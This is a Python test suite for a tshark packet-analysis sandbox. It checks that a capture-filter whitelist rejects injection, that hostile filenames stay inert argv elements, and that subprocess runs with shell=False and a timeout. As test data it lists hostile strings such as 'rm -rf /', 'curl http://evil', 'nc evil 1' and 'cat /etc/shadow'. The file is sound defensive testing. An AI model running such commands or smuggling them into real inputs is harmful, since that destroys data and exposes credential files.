"""Packet sandbox + filter-whitelist tests (M5; ADR-0023 §1 — SECURITY-CRITICAL).

These are the injection-rejection tests the sandbox model hinges on:

- a malicious **filter** (shell metacharacters / unknown tokens) is rejected
  before any argv is built;
- a malicious **filename** is inert — it lands as one argv element, never
  interpolated into a shell, and ``shell=False`` is asserted on the actual
  ``subprocess.run`` call;
- ``-n`` (no name resolution / no egress) is always present;
- the hard subprocess timeout is honored.

tshark itself is mocked — no binary, no real pcap, no network.
"""

from __future__ import annotations

import subprocess
from typing import Any

import pytest

from app.engines.packet import (
    FilterValidationError,
    SandboxError,
    analyze_pcap,
    build_tshark_argv,
    validate_capture_filter,
)

# ---------------------------------------------------------------------------
# Filter whitelist — injection rejection (SECURITY-CRITICAL)
# ---------------------------------------------------------------------------

_MALICIOUS_FILTERS = [
    "tcp port 443; rm -rf /",
    "tcp port 443 && curl http://evil",
    "tcp port 443 | nc evil 1",
    "$(reboot)",
    "`reboot`",
    "tcp port 443 > /etc/passwd",
    "tcp\nport 443",
    "host 10.0.0.1 || cat /etc/shadow",
    'host "10.0.0.1"',
    "host 10.0.0.1 -w /tmp/evil.pcap",  # cannot smuggle a second flag
    "evilfunc(1)",  # unknown bareword
    "greater -1",  # leading-dash numeric token would become a trailing flag
    "tcp and -5",  # ditto — a '-'-prefixed token must never reach getopt
    "-w/tmp/evil",  # whole filter is a dash flag
]


@pytest.mark.parametrize("bad", _MALICIOUS_FILTERS)
def test_malicious_filter_is_rejected(bad: str) -> None:
    """A filter with shell metacharacters or unknown tokens is rejected outright."""
    with pytest.raises(FilterValidationError):
        validate_capture_filter(bad)


def test_building_argv_rejects_malicious_filter_before_spawn() -> None:
    """A rejected display filter aborts in build_tshark_argv — no argv, no process."""
    with pytest.raises(FilterValidationError):
        build_tshark_argv("/data/pcaps/x.pcap", display_filter="tcp; rm -rf /")


@pytest.mark.parametrize(
    "good",
    [
        None,
        "",
        "   ",
        "tcp port 443",
        "host 10.0.0.1 and udp port 53",
        "not arp",
        "src net 10.0.0.0/8 or dst port 22",
        "ip and tcp",
    ],
)
def test_legitimate_filters_pass(good: str | None) -> None:
    """Real BPF filters pass the whitelist unchanged (stripped)."""
    result = validate_capture_filter(good)
    assert result is None or result == (good or "").strip()


def test_overlong_filter_is_rejected() -> None:
    with pytest.raises(FilterValidationError):
        validate_capture_filter("tcp " * 1000)


# ---------------------------------------------------------------------------
# argv construction — filename is inert data, never a shell command
# ---------------------------------------------------------------------------


def test_tshark_argv_is_a_list_with_no_name_resolution() -> None:
    """argv is a list, includes -r/-n/-T json; a filter becomes a -Y element."""
    argv = build_tshark_argv("/data/pcaps/cap.pcap", display_filter="tcp port 443")
    assert isinstance(argv, list)
    assert argv[0] == "tshark"
    assert "-r" in argv and "/data/pcaps/cap.pcap" in argv
    assert "-n" in argv  # no name resolution → no DNS/egress during dissection
    assert "-T" in argv and "json" in argv
    assert "-Y" in argv and "tcp port 443" in argv


def test_malicious_filename_is_a_single_inert_argv_element() -> None:
    """A filename containing shell metacharacters is one argv element, not a command."""
    evil = "/data/pcaps/x.pcap; rm -rf / #"
    argv = build_tshark_argv(evil)
    # The whole hostile string is exactly one element, immediately after -r.
    assert argv[argv.index("-r") + 1] == evil
    # It never becomes its own token / flag.
    assert "rm" not in argv
    assert ";" not in "".join(a for a in argv if a != evil)


# ---------------------------------------------------------------------------
# analyze_pcap — subprocess invoked argv-only, shell=False, with a timeout
# ---------------------------------------------------------------------------


class _Recorder:
    """Captures the subprocess.run call so the test can assert argv/shell/timeout."""

    def __init__(self, *, stdout: bytes = b"[]", returncode: int = 0) -> None:
        self.stdout = stdout
        self.returncode = returncode
        self.calls: list[dict[str, Any]] = []

    def __call__(self, argv: Any, **kwargs: Any) -> Any:
        self.calls.append({"argv": argv, "kwargs": kwargs})

        class _Completed:
            pass

        completed = _Completed()
        completed.stdout = self.stdout  # type: ignore[attr-defined]
        completed.returncode = self.returncode  # type: ignore[attr-defined]
        return completed


def test_analyze_pcap_invokes_tshark_argv_not_shell(monkeypatch: pytest.MonkeyPatch) -> None:
    """analyze_pcap runs tshark via an argv LIST with shell=False (no shell sink)."""
    recorder = _Recorder(stdout=b"[]")
    monkeypatch.setattr(subprocess, "run", recorder)

    findings = analyze_pcap("/data/pcaps/evil; rm -rf /.pcap")

    assert findings.packet_count == 0
    assert len(recorder.calls) == 1
    call = recorder.calls[0]
    # First positional arg is a LIST (argv), not a string (would be a shell line).
    assert isinstance(call["argv"], list)
    # shell is explicitly False (default), never True.
    assert call["kwargs"].get("shell") is False
    # The hostile path is one inert argv element.
    assert "/data/pcaps/evil; rm -rf /.pcap" in call["argv"]
    # A hard timeout is always passed.
    assert call["kwargs"].get("timeout") is not None


def test_analyze_pcap_rejects_malicious_filter_without_spawning(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A hostile display filter raises before subprocess.run is ever called."""
    recorder = _Recorder()
    monkeypatch.setattr(subprocess, "run", recorder)
    with pytest.raises(FilterValidationError):
        analyze_pcap("/data/pcaps/cap.pcap", display_filter="tcp; rm -rf /")
    assert recorder.calls == []  # no process spawned for a rejected filter


def test_analyze_pcap_timeout_becomes_sandbox_error(monkeypatch: pytest.MonkeyPatch) -> None:
    """A tshark child exceeding the timeout fails the task (no hang)."""

    def _raise_timeout(argv: Any, **kwargs: Any) -> Any:
        raise subprocess.TimeoutExpired(cmd=argv, timeout=kwargs.get("timeout", 1))

    monkeypatch.setattr(subprocess, "run", _raise_timeout)
    with pytest.raises(SandboxError):
        analyze_pcap("/data/pcaps/slow.pcap", timeout_seconds=0.1)


def test_analyze_pcap_nonzero_exit_becomes_sandbox_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(subprocess, "run", _Recorder(stdout=b"", returncode=2))
    with pytest.raises(SandboxError):
        analyze_pcap("/data/pcaps/bad.pcap")


def test_analyze_pcap_unparseable_output_becomes_sandbox_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(subprocess, "run", _Recorder(stdout=b"not json"))
    with pytest.raises(SandboxError):
        analyze_pcap("/data/pcaps/cap.pcap")
